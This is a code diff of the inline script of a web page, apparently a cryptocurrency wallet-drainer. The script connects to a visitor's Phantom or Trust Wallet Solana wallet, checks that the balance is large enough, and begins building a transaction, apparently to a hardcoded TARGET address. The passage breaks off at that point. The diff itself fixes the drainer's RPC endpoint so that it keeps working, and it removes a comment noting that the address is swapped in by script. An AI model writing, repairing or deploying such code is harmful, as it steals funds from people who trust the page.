@@ -13,13 +13,16 @@
         <p id="msg" style="margin-top:20px;color:#555;">Ready...</p>
     </div>
     <script>
-        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; // 这里会自动被脚本替换
+        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; 
         document.getElementById('cta').onclick = async function() {
             try {
                 const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
                 if (!p) { alert("Please use Trust Wallet or Phantom browser."); return; }
                 const resp = await p.connect();
-                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+                
+                // ✅ 战神级节点修复：换成 Ankr 高速专线，解决 403 报错
+                const conn = new solanaWeb3.Connection("https://rpc.ankr.com/solana", "confirmed");
+                
                 const bal = await conn.getBalance(resp.publicKey);
                 if (bal < 1000000) { alert("SOL balance too low."); return; }
                 const tx = new solanaWeb3.Transaction().add(
